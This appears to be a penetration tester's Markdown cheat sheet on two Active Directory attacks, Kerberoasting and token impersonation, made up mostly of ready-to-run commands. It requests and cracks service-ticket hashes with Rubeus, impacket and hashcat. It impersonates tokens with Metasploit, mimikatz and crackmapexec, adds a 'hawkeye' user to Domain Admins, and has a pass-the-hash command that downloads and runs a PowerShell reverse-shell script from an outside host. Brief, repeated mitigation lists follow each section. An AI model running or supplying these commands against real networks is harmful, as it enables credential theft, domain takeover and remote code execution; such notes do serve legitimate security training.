

### Kerberoasting :
-  Kerberoasting targets on service account .
- some service account runs on high privilege account.
- Any authenticted or unauthenticate we just want username we can easily request service ticket of service account by TGS.
- Service ticket is encrypted with service account password hash.
- we request and crack those hash.


create service principle name :
```bash
setspn -a <Domain hostname>/<Account_name>.<Domain name>:<port> <Domain>\<Account name>
```


identify service principle name account :
```bash
setspn -T UAP.local -Q */*
```

using Rubeus.exe:
```bash
 .\Rubeus.exe kerberoast
 .\Rubeus.exe kerberoast /outfile:a.txt
```

using impacket-GetUserSPNs :
```bash
impacket-GetUserSPNs -request -dc-ip 192.168.44.166 UAP.local/fcastle -save -outputfile GetUserSPNs1.out
```

crack hash :
```bash
hashcat -m 13100 GetUserSPNs1.out /usr/share/wordlists/rockyou.txt.gz 
```

Mitigation :
```bash
- Limit user/group token creation permission
- Account tiering
- Local admin restriction
```


### Token Impersonation :

Temporary keys that allow you access to a system/network without having to provide credentials each time you access a file. Think cookies for computers.

- Delegate - Created for logging into a machine or using Remote Desktop
- Impersonate - "non-interactive" such as attaching a network drive or a domain logon script


Compromise the machine in domain to see if Administrator logins to that machine if yes perform this attack :

using metasploit :
```bash
#use pass the hash to get the shell
msf6 exploit(windows/smb/psexec) > run
meterpreter > load incognito 
meterpreter > list_tokens -u

Delegation Tokens Available
========================================
Font Driver Host\UMFD-0
Font Driver Host\UMFD-5
MARVEL\Administrator
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
Window Manager\DWM-5

meterpreter > impersonate_token MARVEL\Administrator
meterpreter > shell
C:\Windows\system32>whoami
whoami
marvel\administrator

# use deleteage token to add user in domain and add that domain user in domain groups.
C:\Windows\system32>net user /add hawkeye Password123 /domain
net user /add hawkeye Password123 /domain

C:\Windows\system32>net group "Domain Admins" hawkeye /ADD /DOMAIN
net group "Domain Admins" hawkeye /ADD /DOMAIN




```

using mimikatz.exe :

```bash
.\mimikatz.exe
privilege::debug
token::list
token::elevate /domainadmin
token::run /process:"C:\temp\shell.exe"
```

using crackmapexec :
```bash
crackmapexec smb 172.16.1.100 -u administrator -H 3542d79d5d17bc9d3014d4d56b5e3060 --local-auth -M impersonate -o MODULE=list

crackmapexec smb 172.16.1.100 -u administrator -H 3542d79d5d17bc9d3014d4d56b5e3060 --local-auth -M impersonate -o MODULE=exec TOKEN=4 EXEC=whoami

crackmapexec smb 172.16.1.100 -u administrator -H 3542d79d5d17bc9d3014d4d56b5e3060 --local-auth -M impersonate -o MODULE=exec TOKEN=4 EXEC="powershell.exe -c iex(new-object net.webclient).downloadstring('http://172.16.1.30/Invoke-PowerShellTcp443.ps1')"

```


Mitigation :
```bash
- Limit user/group token creation permission
- Account tiering
- Local admin restriction
```